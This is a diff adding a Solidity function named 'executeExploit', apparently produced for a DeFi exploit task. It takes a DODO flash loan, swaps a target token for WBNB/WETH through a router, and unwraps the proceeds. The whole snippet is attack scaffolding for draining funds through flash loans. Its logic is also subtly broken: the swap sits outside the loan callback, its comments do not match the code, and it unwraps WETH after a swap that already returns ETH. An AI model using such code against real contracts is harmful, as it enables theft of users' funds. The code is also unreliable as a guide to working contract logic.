@@ -1,0 +1,23 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start by acquiring the valuableToken
+    IDODO(flashloanProvider).flashLoan(amount, 0, address(this), "0x0");
+
+    // Next, swap the valuableToken for WBNB using the Pancake Router
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = uniswapRouter.WETH();
+
+    uint256[] memory amountsOut = uniswapRouter.getAmountsOut(amount, path);
+    uint256 amountOutMin = amountsOut[amountsOut.length - 1] * 95 / 100;  // Allowing a slippage of 5%
+
+    uniswapRouter.swapExactTokensForETH(amount, amountOutMin, path, address(this), block.timestamp);
+
+    // Now withdraw the WBNB as ETH back to the contract
+    IWETH(uniswapRouter.WETH()).withdraw(IWETH(uniswapRouter.WETH()).balanceOf(address(this)));
+    
+    // Do any further token conversions or transfers if needed
+}
+</executeExploitCode>
+```
